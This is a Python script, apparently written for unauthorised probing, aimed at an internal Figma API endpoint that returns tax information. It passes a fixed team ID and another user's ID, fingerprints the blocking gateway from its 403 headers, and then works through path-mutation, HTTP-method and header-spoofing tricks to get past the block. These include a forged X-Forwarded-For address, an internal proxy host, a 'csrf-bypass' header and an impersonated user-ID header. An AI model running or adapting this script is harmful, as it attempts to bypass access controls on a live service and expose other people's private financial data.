# -*- coding: utf-8 -*-
"""sinatra_resolver 403 拦截者识别 + 路径变形探测(匿名,只读,低频)
目标: 1) 403 完整响应头(Server/x-amz/via/Set-Cookie -> 识别 WAF 或网关)
      2) 路径变形是否有非 403 成员(大小写/尾斜杠/双斜杠/%编码/POST/方法矩阵)
基线: /api/internal/livegraph/sinatra_resolver/tax_info?team_id=1666382706663462213&userId=1667396392129259941
"""
import io, json, sys, time, urllib.error, urllib.request, urllib.parse
sys.stdout.reconfigure(encoding="utf-8", errors="replace")

A_TEAM = "1666382706663462213"
B_UID = "1667396392129259941"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36"
OUT = io.open("_resolver_403_head_out.txt", "w", encoding="utf-8")

def call(label, url, method="GET", extra_hdrs=None):
    hdrs = {"User-Agent": UA, "Accept": "*/*",
            "Origin": "https://www.figma.com", "Referer": "https://www.figma.com/"}
    if extra_hdrs:
        hdrs.update(extra_hdrs)
    req = urllib.request.Request(url, headers=hdrs, method=method)
    t0 = time.time()
    try:
        r = urllib.request.urlopen(req, timeout=20)
        body = r.read().decode(errors="replace")
        status = r.status
    except urllib.error.HTTPError as e:
        body = e.read().decode(errors="replace")
        status = e.code
        r = e
    except Exception as e:
        OUT.write(f"\n[{label}] !! {type(e).__name__}: {str(e)[:120]}\n")
        print(f"[{label}] !! {type(e).__name__}: {str(e)[:120]}")
        return
    ms = int((time.time() - t0) * 1000)
    OUT.write(f"\n========== [{label}] {method} {status} ({ms}ms) ==========\n")
    for k, v in r.headers.items():
        OUT.write(f"  {k}: {v}\n")
    OUT.write(f"  BODY[{len(body)}]: {body[:500]}\n")
    print(f"[{label}] {method} -> {status} ({ms}ms) hdrs={len(r.headers)} body={len(body)}")

BASE = "https://www.figma.com"
QS = "team_id=%s&userId=%s" % (A_TEAM, B_UID)

print("========== A. 基线: 完整响应头 dump ==========")
call("baseline GET", f"{BASE}/api/internal/livegraph/sinatra_resolver/tax_info?{QS}")
time.sleep(1)

print("\n========== B. 路径变形矩阵 ==========")
variants = [
    ("size-mix",      "/API/Internal/LiveGraph/Sinatra_Resolver/tax_info"),
    ("trail-slash",   "/api/internal/livegraph/sinatra_resolver/tax_info/"),
    ("dbl-slash",     "/api//internal//livegraph//sinatra_resolver//tax_info"),
    ("pct-encode",    "/api/internal/livegraph/sinatra_resolver/%74ax_info"),
    ("dot-segment",   "/api/internal/livegraph/sinatra_resolver/./tax_info"),
    ("dotdot",        "/api/internal/livegraph/sinatra_resolver/../sinatra_resolver/tax_info"),
    ("semi-param",    "/api/internal/livegraph/sinatra_resolver/tax_info;foo=bar"),
    ("backslash",     "/api/internal/livegraph/sinatra_resolver\\tax_info"),
    ("no-resolver",   "/api/internal/livegraph/"),
    ("internal-root", "/api/internal/"),
]
for name, path in variants:
    call(name, f"{BASE}{path}?{QS}")
    time.sleep(1)

print("\n========== C. 方法矩阵 (原路径) ==========")
for m in ("POST", "PUT", "OPTIONS", "HEAD"):
    call(f"method-{m}", f"{BASE}/api/internal/livegraph/sinatra_resolver/tax_info?{QS}", method=m)
    time.sleep(1)

print("\n========== D. 关键头变体 ==========")
call("x-csrf-bypass", f"{BASE}/api/internal/livegraph/sinatra_resolver/tax_info?{QS}",
     extra_hdrs={"x-csrf-bypass": "yes"})
time.sleep(1)
call("x-fwd-for", f"{BASE}/api/internal/livegraph/sinatra_resolver/tax_info?{QS}",
     extra_hdrs={"X-Forwarded-For": "10.0.0.1", "X-Forwarded-Host": "internal-proxy.prod.figma.com"})
time.sleep(1)
call("content-json POST", f"{BASE}/api/internal/livegraph/sinatra_resolver/tax_info",
     method="POST", extra_hdrs={"Content-Type": "application/json",
                                "X-Figma-User-ID": B_UID})

OUT.close()
print("\n落盘: _resolver_403_head_out.txt")
